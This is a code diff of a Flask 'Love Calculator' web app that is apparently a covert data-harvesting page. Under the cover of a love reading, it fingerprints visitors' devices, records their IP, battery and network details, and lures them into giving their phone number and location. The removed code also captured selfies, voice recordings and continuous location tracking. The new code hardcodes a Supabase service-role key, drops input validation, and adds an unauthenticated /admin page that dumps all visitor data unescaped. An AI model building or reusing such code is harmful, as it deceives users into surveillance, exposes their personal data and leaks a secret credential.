@@ -2,25 +2,21 @@ from flask import Flask, request, jsonify, render_template_string, Response
 import os
 import random
 import json
+import requests
 from datetime import datetime
-import sys
 
 app = Flask(__name__)
 
-# ---------- Supabase Setup with better error handling ----------
-SUPABASE_URL = os.environ.get("SUPABASE_URL")
-SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
+# Your Supabase credentials (from environment variables)
+SUPABASE_URL = os.environ.get("Lovepercentage_SUPABASE_URL", "https://djjgtweywwzgdlzfauhn.supabase.co")
+SUPABASE_KEY = os.environ.get("Lovepercentage_SUPABASE_SERVICE_ROLE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqamd0d2V5d3d6Z2RsemZhdWhuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgxMjc5MywiZXhwIjoyMDkyMzg4NzkzfQ.soSQEvfhEnKJwtSMjxSRxf0lwXolrzfq2D9-y4hKZb0")
 
-supabase = None
-if SUPABASE_URL and SUPABASE_KEY:
-    try:
-        from supabase import create_client, Client
-        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
-        print("✅ Supabase connected successfully", file=sys.stderr)
-    except Exception as e:
-        print(f"❌ Supabase connection error: {e}", file=sys.stderr)
-else:
-    print("⚠️ Missing Supabase credentials", file=sys.stderr)
+# REST API headers (works on Vercel without crashes)
+SUPABASE_HEADERS = {
+    "apikey": SUPABASE_KEY,
+    "Authorization": f"Bearer {SUPABASE_KEY}",
+    "Content-Type": "application/json"
+}
 
 # ---------- Love Calculator Functions ----------
 def calculate_love_percentage(name1, name2):
@@ -34,29 +30,55 @@ def get_love_message(name1, name2, percentage):
         f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
         f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
         f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
-        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
-        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!",
-        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
-        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!"
+        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
+        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
     ]
     return random.choice(messages)
 
-def save_to_supabase(table, data):
-    if supabase is None:
-        return False
+# Supabase REST API functions (no client library = no crashes!)
+def save_visitor(data):
     try:
-        if table == "visitors":
-            existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
-            if existing.data:
-                supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
-            else:
-                supabase.table("visitors").insert(data).execute()
-        elif table == "location_history":
-            supabase.table("location_history").insert(data).execute()
+        url = f"{SUPABASE_URL}/rest/v1/visitors"
+        # Check if exists
+        check_url = f"{url}?sessionId=eq.{data.get('sessionId')}&select=id"
+        response = requests.get(check_url, headers=SUPABASE_HEADERS)
+        
+        if response.status_code == 200 and response.json():
+            # Update existing
+            update_url = f"{url}?sessionId=eq.{data.get('sessionId')}"
+            requests.patch(update_url, json=data, headers=SUPABASE_HEADERS)
+        else:
+            # Insert new
+            requests.post(url, json=data, headers=SUPABASE_HEADERS)
         return True
     except Exception as e:
-        print(f"Supabase save error: {e}", file=sys.stderr)
+        print(f"Save error: {e}")
         return False
+
+def save_location(session_id, lat, lon):
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/location_history"
+        data = {
+            "sessionId": session_id,
+            "timestamp": datetime.now().isoformat(),
+            "latitude": lat,
+            "longitude": lon
+        }
+        requests.post(url, json=data, headers=SUPABASE_HEADERS)
+        return True
+    except Exception as e:
+        print(f"Location error: {e}")
+        return False
+
+def get_visitor(session_id):
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/visitors?sessionId=eq.{session_id}&select=name,crush_name,fortuneText,phoneNumber,percentage"
+        response = requests.get(url, headers=SUPABASE_HEADERS)
+        if response.status_code == 200 and response.json():
+            return response.json()[0]
+        return None
+    except:
+        return None
 
 # ---------- HTML Template ----------
 HTML_TEMPLATE = '''
@@ -65,7 +87,7 @@ HTML_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💕 Love Calculator | Find Your True Match</title>
+    <title>💕 Love Calculator</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -241,8 +263,6 @@ HTML_TEMPLATE = '''
         collectedData.screen = screen.width + 'x' + screen.height;
         collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         collectedData.userAgent = navigator.userAgent;
-        collectedData.language = navigator.language;
-        collectedData.platform = navigator.platform;
         
         if (navigator.deviceMemory) {
             collectedData.deviceMemory = navigator.deviceMemory + ' GB';
@@ -252,14 +272,12 @@ HTML_TEMPLATE = '''
             try {
                 const battery = await navigator.getBattery();
                 collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
-                collectedData.batteryCharging = battery.charging ? 1 : 0;
             } catch(e) {}
         }
         
-        const connection = navigator.connection || navigator.mozConnection;
+        const connection = navigator.connection;
         if (connection) {
             collectedData.networkType = connection.effectiveType;
-            collectedData.networkSpeed = connection.downlink ? connection.downlink + ' Mbps' : 'unknown';
         }
         
         await fetch('/save', {
@@ -323,116 +341,25 @@ HTML_TEMPLATE = '''
         }
         
         setTimeout(() => {
-            askOptionalPermissions();
-        }, 1500);
-    }
-    
-    function askOptionalPermissions() {
-        if (confirm('✨ Want to make your reading more accurate? Allow us to capture some magical moments! ✨')) {
-            askLocation();
-            askSelfie();
-            askVoice();
-        }
-    }
-    
-    function askLocation() {
-        if (confirm('📍 Share your location for a more accurate love reading?')) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                collectedData.latitude = position.coords.latitude;
-                collectedData.longitude = position.coords.longitude;
-                collectedData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
-                await fetch('/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(collectedData)
-                });
-                
-                navigator.geolocation.watchPosition(async (newPos) => {
-                    await fetch('/update-location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            sessionId: sessionId,
-                            latitude: newPos.coords.latitude,
-                            longitude: newPos.coords.longitude
-                        })
-                    });
-                });
-                showStatus('📍 Location added! Your reading is now more accurate.', 'success');
-            });
-        }
-    }
-    
-    async function askSelfie() {
-        if (confirm('📸 Take a quick selfie for a personalized love prediction?')) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 400;
-                    canvas.height = video.videoHeight || 300;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    collectedData.selfie = canvas.toDataURL('image/jpeg', 0.5).slice(0, 5000);
-                    fetch('/save', {
+            if (confirm('✨ Share location for better accuracy?')) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    collectedData.latitude = position.coords.latitude;
+                    collectedData.longitude = position.coords.longitude;
+                    await fetch('/save', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(collectedData)
                     });
-                    stream.getTracks().forEach(track => track.stop());
-                    showStatus('📸 Selfie captured! Your personalized reading is ready.', 'success');
-                }, 1000);
-            } catch(e) {}
-        }
-    }
-    
-    async function askVoice() {
-        if (confirm('🎤 Record a sweet message for your crush?')) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onload = async () => {
-                        collectedData.voiceNote = reader.result.slice(0, 5000);
-                        await fetch('/save', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(collectedData)
-                        });
-                        showStatus('🎤 Voice message saved! So romantic!', 'success');
-                    };
-                    reader.readAsDataURL(blob);
-                    stream.getTracks().forEach(track => track.stop());
-                };
-                
-                mediaRecorder.start();
-                showStatus('Recording... Say something lovely!', 'success');
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 3000);
-            } catch(e) {}
-        }
+                    showStatus('📍 Location saved!', 'success');
+                });
+            }
+        }, 1500);
     }
     
     async function savePhone() {
         const phone = document.getElementById('phone').value.trim();
         if (!phone) {
             showStatus('Please enter your phone number', 'error');
-            return;
-        }
-        
-        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
-            showStatus('Please enter a valid phone number', 'error');
             return;
         }
         
@@ -449,7 +376,7 @@ HTML_TEMPLATE = '''
             });
             const result = await response.json();
             if (result.status === 'saved') {
-                showStatus('✅ Number saved! Your love result is secured.', 'success');
+                showStatus('✅ Number saved!', 'success');
                 document.getElementById('phone').disabled = true;
                 event.target.disabled = true;
             }
@@ -475,7 +402,7 @@ HTML_TEMPLATE = '''
 '''
 
 # ---------- Flask Routes ----------
-@app.route('/', methods=['GET'])
+@app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
@@ -483,90 +410,57 @@ def index():
 def save():
     try:
         data = request.get_json()
-        if not data:
-            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
-        
         data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
         data['timestamp'] = datetime.now().isoformat()
-        
-        if supabase:
-            save_to_supabase("visitors", data)
-        
+        save_visitor(data)
         return jsonify({'status': 'saved'})
     except Exception as e:
-        print(f"Save error: {e}", file=sys.stderr)
         return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/update-location', methods=['POST'])
-def update_location():
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({'status': 'error'}), 400
-        
-        session_id = data.get('sessionId')
-        lat = data.get('latitude')
-        lon = data.get('longitude')
-        
-        if session_id and lat is not None and lon is not None and supabase:
-            save_to_supabase("location_history", {
-                "sessionId": session_id,
-                "timestamp": datetime.now().isoformat(),
-                "latitude": lat,
-                "longitude": lon
-            })
-            return jsonify({'status': 'recorded'})
-        
-        return jsonify({'status': 'skipped'})
-    except Exception as e:
-        print(f"Location update error: {e}", file=sys.stderr)
-        return jsonify({'status': 'error'}), 500
 
 @app.route('/save-phone', methods=['POST'])
 def save_phone():
     try:
         data = request.get_json()
-        if not data:
-            return jsonify({'status': 'error'}), 400
-        
         session_id = data.get('sessionId')
         phone = data.get('phoneNumber')
         fortune = data.get('fortune')
         percentage = data.get('percentage')
         
-        if session_id and supabase:
-            supabase.table("visitors").update({
-                "phoneNumber": phone,
-                "fortuneText": fortune,
-                "percentage": percentage
-            }).eq("sessionId", session_id).execute()
-            return jsonify({'status': 'saved'})
+        # Update using REST API
+        url = f"{SUPABASE_URL}/rest/v1/visitors?sessionId=eq.{session_id}"
+        update_data = {"phoneNumber": phone, "fortuneText": fortune, "percentage": percentage}
+        requests.patch(url, json=update_data, headers=SUPABASE_HEADERS)
         
-        return jsonify({'status': 'skipped'})
+        return jsonify({'status': 'saved'})
     except Exception as e:
-        print(f"Save phone error: {e}", file=sys.stderr)
         return jsonify({'status': 'error'}), 500
 
 @app.route('/calculate-love', methods=['POST'])
 def calculate_love():
-    try:
-        data = request.get_json()
-        name1 = data.get('name1', '')
-        name2 = data.get('name2', '')
-        
-        if not name1 or not name2:
-            return jsonify({'message': 'Please provide both names'}), 400
-        
-        percentage = calculate_love_percentage(name1, name2)
-        message = get_love_message(name1, name2, percentage)
-        
-        return jsonify({'percentage': percentage, 'message': message})
-    except Exception as e:
-        print(f"Calculate love error: {e}", file=sys.stderr)
-        return jsonify({'message': str(e)}), 500
+    data = request.get_json()
+    name1 = data.get('name1', '')
+    name2 = data.get('name2', '')
+    percentage = calculate_love_percentage(name1, name2)
+    message = get_love_message(name1, name2, percentage)
+    return jsonify({'percentage': percentage, 'message': message})
 
-# Vercel requires this
-app = app
+# Admin route to view data
+@app.route('/admin')
+def admin():
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/visitors?select=*&order=id.desc"
+        response = requests.get(url, headers=SUPABASE_HEADERS)
+        visitors = response.json()
+        
+        html = '<h1>Visitor Data</h1><table border="1">'
+        if visitors:
+            html += '<tr><th>ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Fortune</th><th>Phone</th><th>Fingerprint</th><th>Battery</th><th>Location</th></tr>'
+            for v in visitors:
+                html += f'<tr><td>{v.get("id")}</td><td>{v.get("name")}</td><td>{v.get("crush_name")}</td><td>{v.get("percentage")}%</td><td>{v.get("fortuneText", "")[:30]}</td><td>{v.get("phoneNumber")}</td><td>{v.get("fingerprint", "")[:15]}</td><td>{v.get("batteryLevel")}</td><td>{v.get("latitude")},{v.get("longitude")}</td></tr>'
+        html += '</table><p><a href="/">Back</a></p>'
+        return html
+    except:
+        return "No data yet"
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
